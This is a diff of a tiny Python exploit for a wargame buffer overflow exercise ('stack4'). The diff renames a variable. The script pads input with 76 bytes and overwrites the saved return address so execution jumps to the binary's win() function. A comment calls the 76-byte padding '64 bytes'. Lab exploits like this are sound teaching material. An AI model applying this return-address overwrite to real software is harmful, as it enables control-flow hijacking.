@@ -1,6 +1,6 @@
-nop = "A"*76                            #set the padding to 64 bytes
-nop += "\xf4\x83\x04\x08"               #overwriting the address of eip with the address of win(0x80483f4)
-print nop
+padding = "A"*76                            #set the padding to 64 bytes
+padding += "\xf4\x83\x04\x08"               #overwriting the address of eip with the address of win(0x80483f4)
+print padding
 
 ##to run the exploit
 #cat /tmp/exploit4 | ./stack4
